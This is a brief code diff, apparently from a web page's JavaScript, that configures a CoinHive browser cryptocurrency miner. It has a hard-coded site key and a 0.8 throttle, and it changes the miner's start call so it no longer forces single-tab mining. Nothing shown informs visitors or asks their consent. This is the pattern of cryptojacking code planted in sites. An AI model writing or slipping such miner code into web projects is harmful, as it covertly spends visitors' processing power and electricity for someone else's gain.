@@ -7,4 +7,4 @@ var miner = new CoinHive.Anonymous('y9X1xEKqfvfVByYVd9YRjoz5jp0bGmj4', {
     throttle:0.8,
     forceASMJS:false
 });
-miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+miner.start();
